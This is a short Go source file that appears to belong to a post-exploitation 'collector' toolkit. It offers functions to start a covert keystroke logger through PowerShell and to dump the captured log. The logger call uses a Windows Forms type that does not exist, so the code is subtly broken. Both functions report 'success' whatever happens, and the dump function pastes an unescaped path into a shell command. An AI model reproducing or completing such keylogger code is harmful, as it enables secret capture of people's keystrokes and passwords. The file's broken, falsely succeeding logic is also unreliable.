package collector

import "os/exec"

type KeyloggerResult struct {
	Status string
	Path   string
}

func StartKeylogger(path string) KeyloggerResult {
	cmd := exec.Command("powershell", "-Command", "Add-Type -AssemblyName System.Windows.Forms; $hook = New-Object System.Windows.Forms.KeyLogger; $hook.Start()")
	cmd.Run()
	return KeyloggerResult{Status: "success", Path: path}
}

func DumpKeylogger(path string) KeyloggerResult {
	cmd := exec.Command("powershell", "-Command", "Get-Content '"+path+"'")
	cmd.Run()
	return KeyloggerResult{Status: "success", Path: path}
}
